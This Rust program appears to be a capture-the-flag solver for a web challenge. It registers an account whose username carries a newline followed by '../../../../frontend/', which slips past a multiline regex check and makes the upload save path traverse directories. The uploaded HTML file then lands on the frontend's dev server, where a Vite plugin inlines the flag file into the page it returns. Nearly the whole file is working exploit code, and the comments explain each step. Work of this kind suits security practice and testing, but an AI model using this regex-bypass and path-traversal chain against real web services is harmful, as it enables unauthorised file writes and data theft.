use std::env;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::{bail, Context, Result};
use httpdate::parse_http_date;
use reqwest::cookie::Jar;
use reqwest::header::DATE;
use serde_json::json;
use tokio::fs;

#[tokio::main]
async fn main() -> Result<()> {
    // The service is only reachable through the nginx front door; the host/port are
    // injected by the test runner rather than hardcoded, since the instance address
    // changes every run.
    let host = env::var("SERVICE_NGINX_HTTP_HOST")
        .context("SERVICE_NGINX_HTTP_HOST is not set")?;
    let port = env::var("SERVICE_NGINX_HTTP_PORT")
        .context("SERVICE_NGINX_HTTP_PORT is not set")?;
    let base_url = format!("http://{host}:{port}");

    let file_path = "expl.html";
    let file_bytes = fs::read(file_path).await?;

    // Use a real cookie jar instead of a hardcoded session cookie: we register our own
    // account below and let reqwest carry the resulting session automatically.
    let jar = Arc::new(Jar::default());
    let client = reqwest::Client::builder()
        .cookie_provider(jar.clone())
        .build()?;

    // Username bypasses the backend's `m` (multiline) flagged regex: only the first
    // line ("a") needs to satisfy `^[a-z0-9]+$`, while the rest of the string -
    // `../../../../frontend/` - is used verbatim as a path-traversal component when
    // the uploaded file is saved, landing it inside the frontend's served directory.
    let nonce = SystemTime::now().duration_since(UNIX_EPOCH)?.as_nanos();
    let email = format!("solver{nonce}@example.com");
    let register_body = json!({
        "email": email,
        "username": "a\n../../../../frontend/",
        "password": "password123",
    });

    let res = client
        .post(format!("{base_url}/api/register"))
        .json(&register_body)
        .send()
        .await?;

    if !res.status().is_success() {
        bail!("registration failed: {}", res.status());
    }

    let part = reqwest::multipart::Part::bytes(file_bytes)
        .file_name("expl.html")
        .mime_str("text/html")?;
    let form = reqwest::multipart::Form::new().part("exploitFile", part);

    let res = client
        .post(format!("{base_url}/api/upload"))
        .multipart(form)
        .send()
        .await?;

    if !res.status().is_success() {
        bail!("upload failed: {}", res.status());
    }

    let date_header = res
        .headers()
        .get(DATE)
        .context("Date header not found in upload response")?;
    let date_str = date_header.to_str()?;
    let datetime = parse_http_date(date_str)?;
    let timestamp = datetime.duration_since(UNIX_EPOCH)?.as_secs();

    println!("Server time (Unix timestamp): {timestamp}");

    // The backend names the uploaded file `<username>_<timestamp>.html`, which after
    // path traversal is served straight off the frontend's vite dev server as
    // `/_<timestamp>.html`; vite-plugin-inline-source then inlines the flag file into
    // the HTML it returns.
    let file_url = format!("{base_url}/_{timestamp}.html");
    println!("Exploit url: {file_url}");

    let res = client.get(&file_url).send().await?;
    if !res.status().is_success() {
        bail!("failed to fetch exploit page: {}", res.status());
    }

    let response = res.text().await?;
    println!("{response}");

    Ok(())
}
